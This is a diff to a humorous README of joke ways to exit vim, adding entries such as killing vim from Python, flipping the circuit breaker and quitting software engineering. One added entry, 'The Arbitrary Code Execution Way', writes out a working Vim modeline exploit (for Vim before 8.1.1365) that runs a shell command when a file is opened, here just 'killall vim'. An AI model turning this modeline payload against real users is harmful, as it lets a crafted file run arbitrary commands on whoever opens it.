@@ -33,6 +33,13 @@ Credit: @kpumuk
 :!grep -P "PPid:\t(\d+)" /proc/$$/status | cut -f2 | xargs kill -9
 ```
 
+## The lazy pythonic using shell way
+Credit: @PozziSan
+
+```bash
+python -c "from os import system; system('killall -9 vim')"
+````
+
 ## The pythonic way
 Credit: @hakluke
 
@@ -527,9 +534,10 @@ exit him
 how exit vim
 ```
 
-### Linux
+## Linux
 ```vim
 :call libcallnr('libc.so.6', 'exit', 0)
+```
 
 ## The canonical way
 Credit: @ligurio
@@ -639,6 +647,44 @@ ssh -i <ec2 keypair pem location> ec2-user@<ec2 instance ip address>
 vim
 ```
 5. In the AWS EC2, select the newly created EC2 instance and terminate the instance.
+
+## The Arbitrary Code Execution Way
+
+Based on https://www.exploit-db.com/exploits/46973. Works with Vim < 8.1.1365.
+
+1. Create a file (say `quit.txt`) with the following data:
+```
+echo ':!killall vim||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="' > quit.txt
+```
+2. Ensure that the modeline option has not been disabled.
+```
+echo "set modeline" >> .vimrc
+```
+3. Open `quit.txt`.
+```
+:e! quit.txt
+```
+
+## The Circuit Breaker Way
+Credit:@Tomcat-42
+
+1. Smoothly leave your computer
+2. Find the nearest electrical circuit breaker panel
+3. Switch off and on the main breaker
+4. Return to your computer
+5. Your computer should no longer be running vim
+
+**Note:** This approach prove itself ineffective against notebooks, desktops on a UPS or remote servers.
+
+## The Permanent Way
+Credit: @jofftiquez
+
+***Quit software engineering for good.***
+
+## The Stack Overflow Way
+Credit: @cobaltblu27
+
+*Yeah exiting vim is really frustrating sometimes. You should definately try using Neovim. It's fast, has terminal emulator, and also supports plugin that will help you exit vim.*
 
 ## The Mario Way
 
